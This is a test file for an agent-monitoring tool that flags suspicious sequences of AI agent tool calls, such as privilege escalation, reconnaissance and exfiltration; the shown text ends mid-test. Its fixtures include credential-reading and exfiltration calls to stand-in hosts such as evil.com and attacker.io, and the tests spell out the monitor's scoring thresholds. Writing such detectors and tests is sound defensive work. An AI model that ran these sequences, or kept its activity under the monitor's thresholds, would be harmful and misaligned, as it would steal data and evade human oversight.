"""Comprehensive tests for the session-level evasion detection system.

Coverage:
  - Each of the five pattern matchers individually with crafted sequences
  - SessionBuffer ring behaviour and TTL-based expiry
  - SessionAnalyzer with all three sensitivity levels
  - SessionMonitor (façade) integration
  - Multi-pattern attacks that trigger multiple matchers
  - Sensitivity threshold boundary conditions
  - Proxy integration (mock — verifies the hook runs without touching real proxies)
  - Critical invariant: single isolated tool calls NEVER trigger a block
"""

from __future__ import annotations

import time
from unittest.mock import AsyncMock, MagicMock

import pytest

from agentward.policy.schema import PolicyDecision
from agentward.session import (
    AnalysisResult,
    SessionMonitor,
    SessionVerdict,
)
from agentward.session.analyzer import SessionAnalyzer, _THRESHOLDS
from agentward.session.buffer import BufferEntry, SessionBuffer
from agentward.session.patterns import (
    ALL_PATTERNS,
    CircularChaining,
    ExfiltrationSequence,
    MatchResult,
    PayloadFragmentation,
    PrivilegeEscalation,
    ReconnaissancePattern,
)
from agentward.session.policy import SessionAction, SessionPolicy, SessionSensitivity


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────


def _entry(
    tool_name: str,
    arguments: dict | None = None,
    verdict: PolicyDecision = PolicyDecision.ALLOW,
    tool_description: str | None = None,
) -> BufferEntry:
    """Convenience factory for BufferEntry objects in tests."""
    return BufferEntry(
        tool_name=tool_name,
        arguments=arguments or {},
        timestamp=time.monotonic(),
        verdict=verdict,
        tool_description=tool_description,
    )


def _policy(
    sensitivity: str = "medium",
    on_suspicious: str = "warn",
    on_evasion: str = "block",
    window_size: int = 50,
    session_ttl: int = 3600,
    enabled: bool = True,
) -> SessionPolicy:
    return SessionPolicy(
        enabled=enabled,
        sensitivity=SessionSensitivity(sensitivity),
        window_size=window_size,
        session_ttl=session_ttl,
        on_suspicious=SessionAction(on_suspicious),
        on_evasion=SessionAction(on_evasion),
    )


# ─────────────────────────────────────────────────────────────────────────────
# SessionBuffer tests
# ─────────────────────────────────────────────────────────────────────────────


class TestSessionBuffer:
    def test_add_and_get_preserves_order(self):
        buf = SessionBuffer(window_size=5)
        entries = [_entry(f"tool_{i}") for i in range(3)]
        for e in entries:
            buf.add("s1", e)
        result = buf.get("s1")
        assert [r.tool_name for r in result] == ["tool_0", "tool_1", "tool_2"]

    def test_ring_evicts_oldest_when_full(self):
        buf = SessionBuffer(window_size=3)
        for i in range(5):
            buf.add("s1", _entry(f"tool_{i}"))
        result = buf.get("s1")
        # Only the last 3 remain
        assert len(result) == 3
        assert result[0].tool_name == "tool_2"
        assert result[-1].tool_name == "tool_4"

    def test_get_unknown_session_returns_empty(self):
        buf = SessionBuffer()
        assert buf.get("nonexistent") == []

    def test_multiple_sessions_are_isolated(self):
        buf = SessionBuffer()
        buf.add("s1", _entry("tool_a"))
        buf.add("s2", _entry("tool_b"))
        assert buf.get("s1")[0].tool_name == "tool_a"
        assert buf.get("s2")[0].tool_name == "tool_b"

    def test_stale_sessions_are_expired(self):
        buf = SessionBuffer(session_ttl=1)
        e = _entry("old_tool")
        # Manually set a past timestamp so expiry fires immediately
        e = BufferEntry(
            tool_name="old_tool",
            arguments={},
            timestamp=time.monotonic() - 10,  # 10 seconds ago
            verdict=PolicyDecision.ALLOW,
        )
        buf._sessions["s1"] = __import__("collections").deque([e], maxlen=50)
        buf._last_activity["s1"] = time.monotonic() - 10

        # Force expiry by calling _expire_stale
        buf._expire_stale()
        assert buf.get("s1") == []

    def test_clear_session_removes_entries(self):
        buf = SessionBuffer()
        buf.add("s1", _entry("t1"))
        buf.add("s1", _entry("t2"))
        buf.clear_session("s1")
        assert buf.get("s1") == []

    def test_active_session_ids_excludes_expired(self):
        buf = SessionBuffer(session_ttl=1)
        buf.add("live", _entry("t"))
        # Manually expire "dead" session
        buf._sessions["dead"] = __import__("collections").deque(maxlen=50)
        buf._last_activity["dead"] = time.monotonic() - 100

        ids = buf.active_session_ids()
        assert "live" in ids
        assert "dead" not in ids

    def test_session_count(self):
        buf = SessionBuffer()
        assert buf.session_count() == 0
        buf.add("s1", _entry("t"))
        buf.add("s2", _entry("t"))
        assert buf.session_count() == 2


# ─────────────────────────────────────────────────────────────────────────────
# PayloadFragmentation tests
# ─────────────────────────────────────────────────────────────────────────────


class TestPayloadFragmentation:
    matcher = PayloadFragmentation()

    def test_no_signal_with_single_entry(self):
        entries = [_entry("read_file", {"path": "/tmp/test.txt"})]
        result = self.matcher.match(entries)
        assert not result.matched
        assert result.score == 0.0

    def test_base64_chunks_across_calls_score(self):
        # Two entries with long base64-ish values
        entries = [
            _entry("write_data", {"data": "SGVsbG9Xb3JsZEhlbGxvV29ybGQ="}),
            _entry("write_data", {"data": "V29ybGRIZWxsb1dvcmxkSGVsbG8="}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score > 0

    def test_hex_segments_flagged(self):
        entries = [
            _entry("send_bytes", {"payload": "deadbeefcafebabe00112233445566"}),
            _entry("send_bytes", {"payload": "aabbccddeeff00112233445566778899"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched

    def test_shell_fragments_flagged(self):
        entries = [
            _entry("run_cmd", {"cmd": "cat /etc/passwd |"}),
            _entry("run_cmd", {"cmd": "grep root | "}),  # both have fragments
        ]
        result = self.matcher.match(entries)
        assert result.matched

    def test_url_encoded_flagged(self):
        # 8+ consecutive %XX sequences
        entries = [
            _entry("fetch", {"url": "%2F%65%74%63%2F%70%61%73%73%77%64"}),
            _entry("fetch", {"url": "%2F%65%74%63%2F%73%68%61%64%6F%77"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched

    def test_short_base64_not_flagged(self):
        # Under 16 chars — should not trigger
        entries = [
            _entry("t1", {"data": "SGVsbG8="}),   # 8 chars
            _entry("t2", {"data": "V29ybGQ="}),   # 8 chars
        ]
        result = self.matcher.match(entries)
        # May or may not match — the regex requires ≥ 16 chars without padding
        assert result.score <= 0.5

    def test_score_saturates_at_four_signals(self):
        b64 = "SGVsbG9Xb3JsZEhlbGxvV29ybGQ="  # 28 chars — valid base64
        entries = [_entry(f"t{i}", {"data": b64}) for i in range(8)]
        result = self.matcher.match(entries)
        assert result.score == 1.0

    def test_clean_text_arguments_no_signal(self):
        entries = [
            _entry("search_docs", {"query": "how to bake bread"}),
            _entry("search_docs", {"query": "sourdough recipe"}),
            _entry("get_weather", {"city": "San Francisco"}),
        ]
        result = self.matcher.match(entries)
        assert not result.matched
        assert result.score == 0.0


# ─────────────────────────────────────────────────────────────────────────────
# PrivilegeEscalation tests
# ─────────────────────────────────────────────────────────────────────────────


class TestPrivilegeEscalation:
    matcher = PrivilegeEscalation()

    def test_single_call_no_escalation(self):
        result = self.matcher.match([_entry("read_file", {"path": "/etc/config"})])
        assert not result.matched

    def test_read_then_write_no_resource_low_score(self):
        entries = [
            _entry("read_file", {}),
            _entry("write_file", {}),
        ]
        result = self.matcher.match(entries)
        # Score 0.40 — below matched threshold of 0.55
        assert not result.matched
        assert result.score == pytest.approx(0.40)

    def test_read_then_write_same_resource_matched(self):
        entries = [
            _entry("read_file", {"path": "/etc/passwd"}),
            _entry("write_file", {"path": "/etc/passwd"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.60)

    def test_full_escalation_no_shared_resource(self):
        entries = [
            _entry("read_file", {}),
            _entry("write_file", {}),
            _entry("execute_script", {}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.85)

    def test_full_escalation_same_resource_max_score(self):
        entries = [
            _entry("read_file", {"path": "/tmp/exploit.sh"}),
            _entry("write_file", {"path": "/tmp/exploit.sh"}),
            _entry("execute_script", {"path": "/tmp/exploit.sh"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(1.0)

    def test_read_only_no_match(self):
        entries = [
            _entry("read_file", {"path": "/a"}),
            _entry("get_content", {"path": "/b"}),
            _entry("list_files", {"path": "/c"}),
        ]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_unrecognised_tools_no_signal(self):
        entries = [
            _entry("weather_lookup", {"city": "NYC"}),
            _entry("currency_convert", {"amount": "100"}),
        ]
        result = self.matcher.match(entries)
        assert not result.matched
        assert result.score == 0.0


# ─────────────────────────────────────────────────────────────────────────────
# ReconnaissancePattern tests
# ─────────────────────────────────────────────────────────────────────────────


class TestReconnaissancePattern:
    matcher = ReconnaissancePattern()

    def test_fewer_than_3_entries_no_signal(self):
        entries = [_entry("ls"), _entry("ls")]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_repeated_env_probe_calls(self):
        entries = [
            _entry("getenv", {"var": "HOME"}),
            _entry("getenv", {"var": "PATH"}),
            _entry("getenv", {"var": "AWS_SECRET_ACCESS_KEY"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched

    def test_filesystem_enumeration_by_path_repetition(self):
        entries = [
            _entry("read_file", {"path": "/home/user/file1.txt"}),
            _entry("read_file", {"path": "/home/user/file2.txt"}),
            _entry("read_file", {"path": "/home/user/file3.txt"}),
        ]
        result = self.matcher.match(entries)
        # 3 identical prefixes → repeated_prefixes → evidence
        assert result.matched

    def test_network_probe_pattern(self):
        entries = [
            _entry("port_scan", {"host": "192.168.1.1"}),
            _entry("port_scan", {"host": "192.168.1.2"}),
            _entry("port_scan", {"host": "192.168.1.3"}),
            _entry("dns_lookup", {"host": "internal.corp"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched

    def test_path_traversal_detection(self):
        entries = [
            _entry("read_file", {"path": "../../etc/passwd"}),
            _entry("read_file", {"path": "../../etc/shadow"}),
            _entry("read_file", {"path": "../../root/.ssh/id_rsa"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched

    def test_clean_varied_calls_no_signal(self):
        entries = [
            _entry("search_web", {"query": "weather today"}),
            _entry("translate_text", {"text": "hello", "target_lang": "es"}),
            _entry("get_stock_price", {"ticker": "AAPL"}),
            _entry("send_email", {"to": "alice@example.com", "subject": "hi"}),
        ]
        result = self.matcher.match(entries)
        assert not result.matched


# ─────────────────────────────────────────────────────────────────────────────
# CircularChaining tests
# ─────────────────────────────────────────────────────────────────────────────


class TestCircularChaining:
    matcher = CircularChaining()

    def test_fewer_than_3_entries_no_cycle(self):
        entries = [_entry("a"), _entry("b")]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_three_tool_cycle_detected(self):
        # a → b → c → a
        entries = [
            _entry("tool_a"),
            _entry("tool_b"),
            _entry("tool_c"),
            _entry("tool_a"),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.70)

    def test_four_tool_cycle_higher_score(self):
        # a → b → c → d → a
        entries = [
            _entry("tool_a"),
            _entry("tool_b"),
            _entry("tool_c"),
            _entry("tool_d"),
            _entry("tool_a"),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.90)

    def test_two_tool_back_and_forth_not_flagged(self):
        # a → b → a: only 2 nodes in cycle — below min threshold
        entries = [_entry("a"), _entry("b"), _entry("a"), _entry("b")]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_self_loop_ignored(self):
        # a → a: self-loops are excluded from graph
        entries = [_entry("a"), _entry("a"), _entry("a")]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_linear_chain_no_cycle(self):
        entries = [_entry("a"), _entry("b"), _entry("c"), _entry("d")]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_cycle_evidence_contains_path(self):
        entries = [
            _entry("exfil_tool"),
            _entry("encode_tool"),
            _entry("send_tool"),
            _entry("exfil_tool"),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert any("exfil_tool" in e for e in result.evidence)


# ─────────────────────────────────────────────────────────────────────────────
# ExfiltrationSequence tests
# ─────────────────────────────────────────────────────────────────────────────


class TestExfiltrationSequence:
    matcher = ExfiltrationSequence()

    def test_single_entry_no_match(self):
        result = self.matcher.match([_entry("read_database")])
        assert not result.matched

    def test_source_then_sink_basic(self):
        entries = [
            _entry("query_database", {"table": "users"}),
            _entry("send_email", {"to": "attacker@evil.com"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.60)

    def test_source_then_sink_with_shared_args_higher_score(self):
        entries = [
            _entry("fetch_secret", {"key": "api_key_prod"}),
            _entry("post_webhook", {"data": "api_key_prod", "url": "https://evil.com"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.90)

    def test_multiple_source_sink_pairs(self):
        entries = [
            _entry("read_database", {"table": "users"}),
            _entry("send_http", {"url": "https://evil.com/1"}),
            _entry("query_database", {"table": "payments"}),
            _entry("post_webhook", {"url": "https://evil.com/2"}),
        ]
        result = self.matcher.match(entries)
        assert result.matched
        assert result.score == pytest.approx(0.80)

    def test_sink_before_source_not_matched(self):
        # Sink comes before source — no forward sequence
        entries = [
            _entry("send_email", {"to": "user@example.com"}),
            _entry("read_database", {"table": "orders"}),
        ]
        result = self.matcher.match(entries)
        assert not result.matched

    def test_gap_too_large_not_matched(self):
        # Source and sink are 11 steps apart (window = 10)
        entries = [_entry("read_database", {})]
        entries += [_entry(f"middle_{i}", {}) for i in range(10)]  # 10 middle calls
        entries += [_entry("send_email", {})]
        result = self.matcher.match(entries)
        # The gap is 11 — outside the exfil window
        assert not result.matched

    def test_no_source_no_sink(self):
        entries = [
            _entry("resize_image", {"width": 100}),
            _entry("convert_currency", {"amount": "50"}),
        ]
        result = self.matcher.match(entries)
        assert not result.matched


# ─────────────────────────────────────────────────────────────────────────────
# SessionAnalyzer tests
# ─────────────────────────────────────────────────────────────────────────────


class TestSessionAnalyzer:
    def test_clean_session_on_empty_entries(self):
        analyzer = SessionAnalyzer(_policy("medium"))
        result = analyzer.check("s1", [])
        assert result.verdict == SessionVerdict.CLEAN
        assert result.aggregate_score == 0.0

    def test_evasion_detected_full_privilege_escalation_medium(self):
        analyzer = SessionAnalyzer(_policy("medium"))
        entries = [
            _entry("read_file", {"path": "/etc/shadow"}),
            _entry("write_file", {"path": "/etc/shadow"}),
            _entry("execute_script", {"path": "/etc/shadow"}),
        ]
        result = analyzer.check("s1", entries)
        # PrivilegeEscalation gives score=1.0 → above medium evasion threshold (0.75)
        assert result.verdict == SessionVerdict.EVASION_DETECTED
        assert result.triggering_pattern == "privilege_escalation"

    def test_suspicious_partial_escalation_medium(self):
        analyzer = SessionAnalyzer(_policy("medium"))
        entries = [
            _entry("read_file", {"path": "/etc/passwd"}),
            _entry("write_file", {"path": "/etc/passwd"}),
        ]
        result = analyzer.check("s1", entries)
        # Score 0.60 → above suspicious threshold (0.50) but below evasion (0.75)
        assert result.verdict == SessionVerdict.SUSPICIOUS

    def test_clean_below_threshold_medium(self):
        analyzer = SessionAnalyzer(_policy("medium"))
        entries = [
            _entry("read_file", {}),
            _entry("write_file", {}),  # score 0.40 — below suspicious (0.50)
        ]
        result = analyzer.check("s1", entries)
        assert result.verdict == SessionVerdict.CLEAN

    def test_low_sensitivity_fewer_false_positives(self):
        analyzer = SessionAnalyzer(_policy("low"))
        entries = [
            _entry("read_file", {"path": "/tmp/a"}),
            _entry("write_file", {"path": "/tmp/a"}),
        ]
        result = analyzer.check("s1", entries)
        # Score 0.60 — below low threshold (0.75)
        assert result.verdict == SessionVerdict.CLEAN

    def test_high_sensitivity_catches_more(self):
        analyzer = SessionAnalyzer(_policy("high"))
        entries = [
            _entry("read_file", {}),
            _entry("write_file", {}),
        ]
        result = analyzer.check("s1", entries)
        # Score 0.40 — above high suspicious threshold (0.25)
        assert result.verdict == SessionVerdict.SUSPICIOUS

    def test_pattern_error_does_not_crash_analyzer(self):
        class BrokenMatcher:
            name = "broken"

            def match(self, entries):
                raise RuntimeError("deliberate test error")

        analyzer = SessionAnalyzer(_policy("medium"))
        analyzer._patterns = [BrokenMatcher()]  # type: ignore[list-item]
        result = analyzer.check("s1", [_entry("any_tool")])
        # Should return CLEAN with zero score, not raise
        assert result.verdict == SessionVerdict.CLEAN
        assert result.aggregate_score == 0.0

    def test_aggregate_uses_maximum_score(self):
        """The aggregate score is the max across all patterns, not the sum."""
        analyzer = SessionAnalyzer(_policy("medium"))
        # Use the real circular chaining pattern: 3-node cycle → score 0.70
        entries = [
            _entry("tool_a"),
            _entry("tool_b"),
            _entry("tool_c"),
            _entry("tool_a"),
        ]
        result = analyzer.check("s1", entries)
        # circular_chaining should give 0.70 → SUSPICIOUS at medium (threshold 0.50)
        assert result.verdict == SessionVerdict.SUSPICIOUS
        assert result.triggering_pattern == "circular_chaining"

    def test_thresholds_match_expected_values(self):
        for sensitivity, (susp_t, evasion_t) in _THRESHOLDS.items():
            assert 0.0 < susp_t < evasion_t <= 1.0, (
                f"Bad thresholds for {sensitivity}: {susp_t}, {evasion_t}"
            )


# ─────────────────────────────────────────────────────────────────────────────
# SessionMonitor (façade) tests
# ─────────────────────────────────────────────────────────────────────────────


class TestSessionMonitor:
    def test_disabled_monitor_returns_clean(self):
        monitor = SessionMonitor(_policy(enabled=False))
        result = monitor.record_and_check(
            "s1", "any_tool", {}, PolicyDecision.ALLOW,
        )
        assert result.verdict == SessionVerdict.CLEAN
        assert result.aggregate_score == 0.0

    def test_from_policy_returns_none_when_disabled(self):
        p = _policy(enabled=False)
        monitor = SessionMonitor.from_policy(p)
        assert monitor is None

    def test_from_policy_returns_monitor_when_enabled(self):
        p = _policy(enabled=True)
        monitor = SessionMonitor.from_policy(p)
        assert isinstance(monitor, SessionMonitor)

    def test_new_session_id_format(self):
        sid = SessionMonitor.new_session_id("stdio")
        assert sid.startswith("stdio-")
        assert len(sid) == len("stdio-") + 12

    def test_session_ids_are_unique(self):
        ids = {SessionMonitor.new_session_id() for _ in range(100)}
        assert len(ids) == 100

    def test_record_and_check_accumulates_entries(self):
        monitor = SessionMonitor(_policy("medium"))
        # First call — only one entry, patterns need ≥ 2 to fire
        r1 = monitor.record_and_check("s1", "read_file", {}, PolicyDecision.ALLOW)
        assert r1.verdict == SessionVerdict.CLEAN
        # Second call — now two entries with full-escalation path
        r2 = monitor.record_and_check(
            "s1", "write_file", {"path": "/etc/shadow"}, PolicyDecision.ALLOW
        )
        # Score 0.40 — clean at medium
        assert r2.verdict == SessionVerdict.CLEAN

    def test_evasion_after_full_escalation_sequence(self):
        monitor = SessionMonitor(_policy("medium"))
        calls = [
            ("read_file", {"path": "/etc/shadow"}),
            ("write_file", {"path": "/etc/shadow"}),
            ("execute_script", {"path": "/etc/shadow"}),
        ]
        last_result = None
        for tool, args in calls:
            last_result = monitor.record_and_check("s1", tool, args, PolicyDecision.ALLOW)
        assert last_result is not None
        assert last_result.verdict == SessionVerdict.EVASION_DETECTED

    def test_should_block_on_evasion_with_block_action(self):
        monitor = SessionMonitor(_policy("medium", on_evasion="block"))
        from agentward.session.analyzer import SessionVerdict as SV

        fake = AnalysisResult(
            verdict=SV.EVASION_DETECTED,
            aggregate_score=0.9,
            pattern_results=[],
            triggering_pattern="circular_chaining",
        )
        assert monitor.should_block(fake) is True

    def test_should_not_block_on_evasion_with_log_action(self):
        monitor = SessionMonitor(_policy("medium", on_evasion="log"))
        from agentward.session.analyzer import SessionVerdict as SV

        fake = AnalysisResult(
            verdict=SV.EVASION_DETECTED,
            aggregate_score=0.9,
            pattern_results=[],
            triggering_pattern="circular_chaining",
        )
        assert monitor.should_block(fake) is False

    def test_should_not_block_on_suspicious_with_warn_action(self):
        monitor = SessionMonitor(_policy("medium", on_suspicious="warn"))
        from agentward.session.analyzer import SessionVerdict as SV

        fake = AnalysisResult(
            verdict=SV.SUSPICIOUS,
            aggregate_score=0.6,
            pattern_results=[],
            triggering_pattern="reconnaissance",
        )
        assert monitor.should_block(fake) is False

    def test_should_block_on_suspicious_with_pause_action(self):
        monitor = SessionMonitor(_policy("medium", on_suspicious="pause"))
        from agentward.session.analyzer import SessionVerdict as SV

        fake = AnalysisResult(
            verdict=SV.SUSPICIOUS,
            aggregate_score=0.6,
            pattern_results=[],
            triggering_pattern="reconnaissance",
        )
        assert monitor.should_block(fake) is True

    def test_pause_session_blocks_is_paused(self):
        monitor = SessionMonitor(_policy())
        monitor.pause_session("s1")
        assert monitor.is_paused("s1") is True

    def test_resume_session_clears_pause(self):
        monitor = SessionMonitor(_policy())
        monitor.pause_session("s1")
        monitor.resume_session("s1")
        assert monitor.is_paused("s1") is False

    def test_pause_also_clears_buffer_on_resume(self):
        monitor = SessionMonitor(_policy())
        monitor.record_and_check("s1", "t1", {}, PolicyDecision.ALLOW)
        monitor.pause_session("s1")
        monitor.resume_session("s1")
        # Buffer should be cleared so stale entries don't contaminate next run
        entries = monitor._buffer.get("s1")
        assert entries == []

    def test_active_sessions_reflects_state(self):
        monitor = SessionMonitor(_policy())
        monitor.record_and_check("s1", "tool_a", {}, PolicyDecision.ALLOW)
        monitor.record_and_check("s2", "tool_b", {}, PolicyDecision.ALLOW)
        statuses = monitor.active_sessions()
        session_ids = {s.session_id for s in statuses}
        assert "s1" in session_ids
        assert "s2" in session_ids

    def test_should_warn_for_suspicious_with_warn_action(self):
        monitor = SessionMonitor(_policy("medium", on_suspicious="warn"))
        from agentward.session.analyzer import SessionVerdict as SV

        fake = AnalysisResult(
            verdict=SV.SUSPICIOUS,
            aggregate_score=0.6,
            pattern_results=[],
            triggering_pattern="reconnaissance",
        )
        assert monitor.should_warn(fake) is True

    def test_should_not_warn_for_clean(self):
        monitor = SessionMonitor(_policy())
        from agentward.session.analyzer import SessionVerdict as SV

        fake = AnalysisResult(
            verdict=SV.CLEAN,
            aggregate_score=0.0,
            pattern_results=[],
            triggering_pattern="",
        )
        assert monitor.should_warn(fake) is False


# ─────────────────────────────────────────────────────────────────────────────
# CRITICAL INVARIANT: single calls are never blocked by session monitor alone
# ─────────────────────────────────────────────────────────────────────────────


class TestSingleCallNeverBlocked:
    """The session monitor must never block an isolated tool call.

    No matter what tool is called, a session with a single entry must
    always return CLEAN — only sequences can trigger a verdict.
    """

    @pytest.mark.parametrize("tool_name", [
        "execute_shell",
        "send_email",
        "delete_file",
        "write_database",
        "read_secret",
        "post_http",
        "query_database",
        "run_code",
        "fetch_url",
        "upload_s3",
    ])
    def test_single_call_is_always_clean(self, tool_name: str):
        monitor = SessionMonitor(_policy("high"))  # most aggressive sensitivity
        result = monitor.record_and_check(
            "s1",
            tool_name,
            {"arg": "SGVsbG9Xb3JsZEhlbGxvV29ybGQ="},  # looks like base64
            PolicyDecision.ALLOW,
        )
        assert result.verdict == SessionVerdict.CLEAN, (
            f"Single call to {tool_name!r} triggered {result.verdict.value} — "
            f"session monitor must never block isolated calls."
        )
        assert not monitor.should_block(result)

    def test_every_pattern_returns_clean_on_single_entry(self):
        single = [_entry("execute_shell", {"cmd": "cat /etc/passwd | grep root"})]
        for pattern in ALL_PATTERNS:
            result = pattern.match(single)
            assert not result.matched, (
                f"Pattern {pattern.name!r} matched a single-entry window — "
                f"this would block the very first tool call."
            )


# ─────────────────────────────────────────────────────────────────────────────
# Multi-pattern attack tests
# ─────────────────────────────────────────────────────────────────────────────


class TestMultiPatternAttacks:
    """Sequences that trigger multiple patterns simultaneously."""

    def test_exfil_plus_escalation(self):
        """Read secret → escalate → exfiltrate via email."""
        monitor = SessionMonitor(_policy("medium"))
        sequence = [
            ("read_file", {"path": "/etc/shadow"}),
            ("write_file", {"path": "/tmp/stage.txt"}),
            ("execute_script", {"path": "/tmp/encode.sh"}),
            ("send_email", {"to": "attacker@evil.com", "body": "/tmp/stage.txt"}),
        ]
        last = None
        for tool, args in sequence:
            last = monitor.record_and_check("s1", tool, args, PolicyDecision.ALLOW)

        assert last is not None
        assert last.verdict != SessionVerdict.CLEAN
        # Both privilege_escalation and exfiltration_sequence should score
        scored_patterns = {r.pattern_name for r in last.pattern_results if r.score > 0}
        assert "privilege_escalation" in scored_patterns

    def test_recon_then_exfil(self):
        """Environmental recon followed by data exfiltration."""
        monitor = SessionMonitor(_policy("medium"))
        sequence = [
            ("getenv", {"var": "AWS_ACCESS_KEY_ID"}),
            ("getenv", {"var": "AWS_SECRET_ACCESS_KEY"}),
            ("getenv", {"var": "DATABASE_URL"}),
            ("fetch_database_records", {"table": "users"}),
            ("post_webhook", {"url": "https://attacker.io/exfil"}),
        ]
        last = None
        for tool, args in sequence:
            last = monitor.record_and_check("s1", tool, args, PolicyDecision.ALLOW)

        assert last is not None
        scored = {r.pattern_name for r in last.pattern_results if r.score > 0}
        assert "reconnaissance" in scored

    def test_circular_chain_with_base64_payload(self):
        """Circular tool chain carrying base64-encoded fragments."""
        monitor = SessionMonitor(_policy("high"))
        b64 = "SGVsbG9Xb3JsZEhlbGxvV29ybGQ="
        sequence = [
            ("encode_tool", {"data": b64}),
            ("transform_tool", {"data": b64}),
            ("relay_tool", {"data": b64}),
            ("encode_tool", {"data": b64}),  # close the cycle
        ]
        last = None
        for tool, args in sequence:
            last = monitor.record_and_check("s1", tool, args, PolicyDecision.ALLOW)

        assert last is not None
        assert last.verdict != SessionVerdict.CLEAN
        scored = {r.pattern_name for r in last.pattern_results if r.score > 0}
        assert "circular_chaining" in scored
        assert "payload_fragmentation" in scored


# ─────────────────────────────────────────────────────────────────────────────
# Proxy integration (mock)
# ─────────────────────────────────────────────────────────────────────────────


class TestProxyIntegration:
    """Verify that SessionMonitor is correctly integrated in the proxy objects.

    These tests use mocks to avoid spinning up real proxies/subprocesses.
    They verify:
      1. The proxy passes session_monitor through to its internal attributes.
      2. record_and_check is called after log_tool_call.
      3. should_block returning True results in a blocked call.
      4. Disabled session monitor (None) results in no session calls.
    """

    def test_stdio_proxy_stores_session_monitor(self):
        from agentward.proxy.server import StdioProxy
        from agentward.audit.logger import AuditLogger

        monitor = SessionMonitor(_policy())
        proxy = StdioProxy(
            server_command=["echo"],
            policy_engine=None,
            audit_logger=AuditLogger(),
            session_monitor=monitor,
        )
        assert proxy._session_monitor is monitor
        assert proxy._session_id.startswith("stdio-")

    def test_stdio_proxy_no_monitor_has_empty_session_id(self):
        from agentward.proxy.server import StdioProxy
        from agentward.audit.logger import AuditLogger

        proxy = StdioProxy(
            server_command=["echo"],
            policy_engine=None,
            audit_logger=AuditLogger(),
            session_monitor=None,
        )
        assert proxy._session_monitor is None
        assert proxy._session_id == ""

    def test_http_proxy_stores_session_monitor(self):
        from agentward.proxy.http import HttpProxy
        from agentward.audit.logger import AuditLogger

        monitor = SessionMonitor(_policy())
        proxy = HttpProxy(
            backend_url="http://127.0.0.1:18790",
            listen_host="127.0.0.1",
            listen_port=18900,
            policy_engine=None,
            audit_logger=AuditLogger(),
            session_monitor=monitor,
        )
        assert proxy._session_monitor is monitor
        assert proxy._session_id.startswith("http-")

    def test_session_monitor_record_called_after_log(self):
        """record_and_check must be called and its result inspected."""
        monitor = MagicMock(spec=SessionMonitor)
        monitor.record_and_check.return_value = AnalysisResult(
            verdict=SessionVerdict.CLEAN,
            aggregate_score=0.0,
            pattern_results=[],
            triggering_pattern="",
        )
        monitor.should_block.return_value = False
        monitor.should_pause_session.return_value = False

        # Directly exercise the session-monitor logic path used by the proxy
        result = monitor.record_and_check(
            "test-session", "read_file", {"path": "/tmp/x"}, PolicyDecision.ALLOW
        )
        assert result.verdict == SessionVerdict.CLEAN
        monitor.record_and_check.assert_called_once()

    def test_session_monitor_disabled_is_none(self):
        """from_policy with enabled=False returns None — proxy skips all calls."""
        p = _policy(enabled=False)
        monitor = SessionMonitor.from_policy(p)
        assert monitor is None

        # Simulate the proxy guard: `if self._session_monitor is not None`
        called = False
        session_monitor = monitor  # None

        def _fake_record():
            nonlocal called
            called = True

        if session_monitor is not None:
            _fake_record()

        assert not called


# ─────────────────────────────────────────────────────────────────────────────
# Policy schema integration
# ─────────────────────────────────────────────────────────────────────────────


class TestPolicySchemaIntegration:
    def test_default_policy_has_session_disabled(self):
        from agentward.policy.schema import AgentWardPolicy

        policy = AgentWardPolicy(version="1")
        assert not policy.session.enabled
        assert policy.session.sensitivity == SessionSensitivity.MEDIUM
        assert policy.session.window_size == 50

    def test_session_field_can_be_set_in_yaml(self):
        from agentward.policy.loader import load_policy

        yaml_content = """
version: "1"
session:
  enabled: true
  sensitivity: high
  window_size: 30
  session_ttl: 1800
  on_suspicious: warn
  on_evasion: block
"""
        import tempfile
        import os

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False, encoding="utf-8"
        ) as f:
            f.write(yaml_content)
            tmp_path = f.name

        try:
            from pathlib import Path
            p = load_policy(Path(tmp_path))
            assert p.session.enabled is True
            assert p.session.sensitivity == SessionSensitivity.HIGH
            assert p.session.window_size == 30
            assert p.session.session_ttl == 1800
            assert p.session.on_suspicious == SessionAction.WARN
            assert p.session.on_evasion == SessionAction.BLOCK
        finally:
            os.unlink(tmp_path)

    def test_session_field_optional_in_yaml(self):
        """A policy YAML without a session block still loads correctly."""
        from agentward.policy.loader import load_policy
        import tempfile
        import os

        yaml_content = 'version: "1"\ndefault_action: allow\n'
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False, encoding="utf-8"
        ) as f:
            f.write(yaml_content)
            tmp_path = f.name

        try:
            from pathlib import Path
            p = load_policy(Path(tmp_path))
            assert not p.session.enabled  # default
        finally:
            os.unlink(tmp_path)


# ─────────────────────────────────────────────────────────────────────────────
# Audit logger integration
# ─────────────────────────────────────────────────────────────────────────────


class TestAuditLoggerIntegration:
    def test_log_session_event_writes_to_log(self):
        import json
        import tempfile
        from pathlib import Path
        from agentward.audit.logger import AuditLogger

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".jsonl", delete=False
        ) as f:
            tmp_path = Path(f.name)

        try:
            logger = AuditLogger(log_path=tmp_path)
            logger.log_session_event(
                session_id="test-session-123",
                tool_name="execute_shell",
                verdict="EVASION_DETECTED",
                aggregate_score=0.90,
                triggering_pattern="circular_chaining",
